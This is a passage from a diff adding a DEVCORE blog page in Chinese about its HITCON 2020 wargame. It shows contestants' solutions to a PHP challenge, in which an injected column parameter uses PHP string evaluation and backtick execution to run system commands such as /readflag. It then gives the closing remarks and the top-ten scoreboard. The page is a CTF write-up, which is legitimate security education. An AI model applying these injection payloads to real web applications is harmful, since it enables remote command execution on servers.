+SQL: SELECT id+"${print_r(`/readflag`)}" FROM mytable WHERE id = '1'
+PHP: $output = $row-&gt;id+"${print_r(`/readflag`)}";
+</code></pre></div></div>
+
+<p>這個解法利用加法運算子組合 id identifier 和雙引號字串，接著在雙引號字串利用 evaluation 特性執行 PHP 程式碼，透過 execution operator 執行系統指令後再以 print_r 強制輸出結果，取得 flag。</p>
+
+<p><strong>匿名:</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: id=1&amp;column=id%2b"${`yes`}"
+
+SQL: SELECT id+"${`yes`}" FROM mytable WHERE id = '1'
+PHP: $output = $row-&gt;id+"${`yes`}";
+</code></pre></div></div>
+
+<p>另外還收到一個匿名提交的解法，思路與前面相同，總之就也附上來了～。</p>
+
+<h2 id="結語">結語</h2>
+
+<p>以上就是我們這次為 HITCON 2020 準備的 Wargame 的其中一道開放式題目的分享和大家的解法介紹，不知道各位喜不喜歡呢？<del>喜歡的話記得訂閱、按讚、分享以及開啟小鈴鐺唷！</del></p>
+
+<p>題外話，這次我們總共有 5 道 100 分題目，是領取小獎品的基本條件，但我們還準備了 3 道僅有 1 分的 bonus 題目，類型是 2 個 web 與 1 個唯一的 pwn，讓大家能進一步挑戰進階實戰能力，而這次有解開至少一道 bonus 題的為以下兩位參加者：</p>
+
+<ul>
+  <li>11/14 Balsn CTF 2020 總獎金十萬元: 502 分</li>
+  <li>FI: 501</li>
+</ul>
+
+<p>友情工商：由台灣知名 CTF 戰隊之一的 Balsn 舉辦的 Balsn CTF 2020 將在 11/14 舉辦，他們準備了豐富的比賽獎金與充滿創意、技術性的題目，想證明實力的朋友們可不要錯過了！</p>
+
+<p>Balsn Twitter: https://twitter.com/balsnctf/status/1316925652700889090<br />
+Balsn CTF 2020 on CTFtime: https://ctftime.org/event/1122/</p>
+
+<p>另外的另外，最後讓我們恭喜 <strong>yuawn (https://twitter.com/_yuawn)</strong> 以 1 分之姿榮獲 <strong>DEVCORE Wargame 最後 1 名</strong>！全場排行榜上唯一得分不超過 100 的參加者，同時他也取得了 pwn 題目的首殺兼唯一解，恭喜他 👏👏。</p>
+
+<p>最後附上今年的前十名，就讓我們 2021 年再見囉～</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Place</th>
+      <th>Team</th>
+      <th>Score</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>1</td>
+      <td>11/14 Balsn CTF 2020 總獎金十萬元</td>
+      <td>502</td>
+    </tr>
+    <tr>
+      <td>2</td>
+      <td>FI</td>
+      <td>501</td>
+    </tr>
+    <tr>
+      <td>3</td>
+      <td>mico</td>
+      <td>500</td>
+    </tr>
+    <tr>
+      <td>4</td>
+      <td>ankleboy</td>
+      <td>500</td>
+    </tr>
+    <tr>
+      <td>5</td>
+      <td>hans00</td>
+      <td>500</td>
+    </tr>
+    <tr>
+      <td>6</td>
+      <td>Meow</td>
+      <td>500</td>
+    </tr>
+    <tr>
+      <td>7</td>
+      <td>ginoah</td>
+      <td>500</td>
+    </tr>
+    <tr>
+      <td>8</td>
+      <td>cjiso1117</td>
+      <td>500</td>
+    </tr>
+    <tr>
+      <td>9</td>
+      <td>zodiuss</td>
+      <td>500</td>
+    </tr>
+    <tr>
+      <td>10</td>
+      <td>dalun</td>
+      <td>500</td>
+    </tr>
+  </tbody>
+</table>
+
+              </article>
+              <p class="sns-widgets">
+                Share this on <button class="appearance-none sns-widgets__button" id="sns-facebook" type="button">Facebook</button> or <button class="appearance-none sns-widgets__button" id="sns-twitter" type="button">Twitter</button>
+              </p>
+          
+              <div class="heading--side-lined">
+                About <span class="blog-author-photo" style="background-image: url(/assets/themes/devcore-v2/images/avatar/cyku.jpg)"></span> <a href="/blog/author/cyku" class="blog-author-name">Cyku</a> 
+              </div>
+              <p class="blog-author-info">
+                一位熱愛網站應用程式安全技術的夢想家，<br />專長於滲透測試，夢想是成為光之美少女。
+              </p>
+          
+              <div class="heading--side-lined">
+                讀者留言
+              </div>
+              <div class="blog-comments">
+                
+
+
+  <div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_developer = 1;
+    var disqus_shortname = 'd3vc0r3'; // required: replace example with your forum shortname
+    
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = 'https://' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">blog comments powered by <span class="logo-disqus">Disqus</span></a>
+
+
+
+
+              </div>
+            </div>
+          </div>
+
+
+
+
+
+
+</main>
+      <div class="container--wrapper">
+
+        <div class="relative-posts">
+          <div class="heading--side-lined container">
+            最新消息
+          </div>
+          <div class="relative-posts__cells">
+  
+            <section class="card">
+              <a href="/blog/2020/10/30/devcore-wargame-at-hitcon-2020/">
+                <div class="card__thumbnail" style="background-image: url(https://devco.re/assets/img/blog/20201030/cover.png)"></div>
+                <h3 class="card__title">
+                  DEVCORE Wargame at HITCON 2020
+                </h3></a>
+              <div class="card__tags">
+  
+                <a href="/blog/tag/PHP/" class="card__tag">PHP</a><a href="/blog/tag/RCE/" class="card__tag">RCE</a>
+              </div>
+              <small class="card__category"><a href="/blog/category/技術專欄/">技術專欄</a></small>
+            </section>
+  
+            <section class="card">
+              <a href="/blog/2020/10/13/mitigate-real-threats-by-framework-and-standards/">
+                <div class="card__thumbnail" style="background-image: url(https://devco.re/assets/img/blog/20201013/5.png)"></div>
+                <h3 class="card__title">
+                  你的資安策略夠明確嗎？透過框架優先緩解真實威脅
+                </h3></a>
+              <div class="card__tags">
+  
+                <a href="/blog/tag/Strategy/" class="card__tag">Strategy</a>
+              </div>
+              <small class="card__category"><a href="/blog/category/科普文章/">科普文章</a></small>
+            </section>
+  
+            <section class="card">
+              <a href="/blog/2020/09/12/how-I-hacked-Facebook-again-unauthenticated-RCE-on-MobileIron-MDM/">
+                <div class="card__thumbnail" style="background-image: url(https://devco.re/assets/img/blog/20200912/5.png)"></div>
+                <h3 class="card__title">
+                  看我如何再一次駭進 Facebook，一個在 MobileIron MDM 上的遠端程式碼執行漏洞!
+                </h3></a>
+              <div class="card__tags">
+  
+                <a href="/blog/tag/Advisory/" class="card__tag">Advisory</a><a href="/blog/tag/CVE/" class="card__tag">CVE</a><a href="/blog/tag/RCE/" class="card__tag">RCE</a><a href="/blog/tag/Facebook/" class="card__tag">Facebook</a><a href="/blog/tag/BugBounty/" class="card__tag">BugBounty</a>
+              </div>
+              <small class="card__category"><a href="/blog/category/技術專欄/">技術專欄</a></small>
+            </section>
+  
+          </div>
+        </div>
+
+
+        <div class="contact-section container">
+          <h2 class="contact-section__title">
+            用最真實的攻擊，驗證企業的防禦
+          </h2>
+          <a href="/contact/" class="home-contact__button button--dense">聯絡我們</a>
+        </div>
+
+        <footer class="main-footer">
+          <div class="main-footer__about">
+            戴夫寇爾提供<br class="mobile-only" /><a href="/services/penetration-test" class="link">滲透測試</a>、<a href="/services/red-team" class="link">紅隊演練</a>、<a href="/services/security-consulting" class="link">資安顧問</a>與<a href="/services/security-training" class="link">教育訓練</a>服務<br />在<a href="https://www.facebook.com/D3VC0RE" class="link" target="_blank">Facebook</a>或<a href="https://twitter.com/d3vc0r3" class="link" target="_blank">Twitter</a>上追蹤我們的<a href="/blog/" class="link">最新訊息</a><br />瞭解更多戴夫寇爾的<a href="/about/" class="link">駭客思維</a>
+          </div>
+          <div class="main-footer__snses"><a href="https://www.facebook.com/D3VC0RE" class="main-footer__sns" target="_blank">
+                <svg class="icon-fb icon"><use xlink:href="#icon-fb" /></svg></a><a href="https://twitter.com/d3vc0r3" class="main-footer__sns" target="_blank">
+                <svg class="icon-twitter icon"><use xlink:href="#icon-twitter" /></svg></a>
+          </div>
+          <address class="main-footer__address">
+            <ul class="list--unstyled">
+              <li>
+                地址 10487 台北市中山區復興北路 168 號 10 樓
+              </li>
+              <li>
+                Email contact@devco.re
+              </li>
+              <li>
+                電話 02-2718-0156
+              </li>
+              <li>
+                統編 53955237
+              </li>
+            </ul>
+          </address><small class="main-footer__copyright"><a href="/" class="logo">DEVCORE</a>©2020 DEVCORE 戴夫寇爾</small>
+        </footer>
+      </div>
+    </div>
+    <script src="/assets/themes/devcore-v2/javascripts/webpack_bundle.js"></script>
+
+
+
+  <script type="text/javascript">
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-30830800-1']);
+  _gaq.push(['_trackPageview', location.pathname + location.search + location.hash]);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+</script>
+
+
+
+
+
+  </body>
+</html>
+
+
+
+
